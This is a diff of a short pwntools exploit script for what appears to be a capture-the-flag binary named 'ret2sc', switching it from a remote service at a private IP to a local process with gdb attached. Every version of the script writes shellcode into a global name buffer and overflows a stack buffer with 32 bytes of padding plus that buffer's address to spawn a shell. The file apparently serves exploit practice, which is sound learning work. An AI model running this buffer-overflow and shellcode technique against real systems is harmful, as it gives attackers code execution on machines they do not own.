@@ -2,16 +2,13 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
-host = "10.211.55.28"
-port = 8888
+io = process('./ret2sc')
+context.arch = 'i386'
 
-r = remote(host,port)
-name = 0x804a060
-r.recvuntil(":")
-r.sendline(asm(shellcraft.sh()))
-r.recvuntil(":")
-payload = "a"*32
-payload += p32(name)
-r.sendline(payload)
+name = 0x0804A060
+io.sendlineafter("Name:",asm(shellcraft.sh()))
 
-r.interactive()
+payload = 'a'*32+p32(name)
+io.sendlineafter("Try your best:",payload)
+gdb.attach(io)
+io.interactive()
